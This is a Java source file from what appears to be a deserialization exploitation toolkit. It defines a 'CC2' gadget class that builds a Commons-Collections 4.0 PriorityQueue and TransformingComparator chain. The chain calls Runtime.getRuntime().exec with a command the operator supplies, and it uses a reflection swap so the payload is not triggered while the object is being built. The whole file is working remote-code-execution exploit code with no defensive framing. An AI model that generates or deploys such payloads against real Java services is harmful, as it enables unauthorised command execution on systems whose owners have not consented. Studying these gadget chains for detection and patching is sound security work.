package com.bcvgh.core.unser.gadgets.exec;

import com.bcvgh.core.unser.annotation.DependenciesVersion;
import com.bcvgh.core.unser.annotation.RequireParameter;
import com.bcvgh.core.unser.core.pojo.UnSerInput;
import com.bcvgh.core.unser.gadgets.ObjectPayload;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.util.Comparator;
import java.util.PriorityQueue;

import static com.bcvgh.core.unser.gadgets.util.Reflections.setFieldValue;

@DependenciesVersion("Commons-collections-4.0")
@RequireParameter("Command")
public class CC2 implements ObjectPayload {
    @Override
    public <T> Object getObject(UnSerInput unSerInput) throws Exception {
        Transformer[] fakeTransformers = new Transformer[] {new
                ConstantTransformer(1)};
        Transformer[]transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class,Class[].class }, new
                        Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class,
                        Object[].class }, new
                        Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class },
                        new String[] {
                                unSerInput.getCommand()}),
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        Comparator comparator = new
                TransformingComparator(transformerChain);
        PriorityQueue queue = new PriorityQueue(2, comparator);
        queue.add(1);
        queue.add(2);
        setFieldValue(transformerChain, "iTransformers", transformers);
        return queue;
    }
}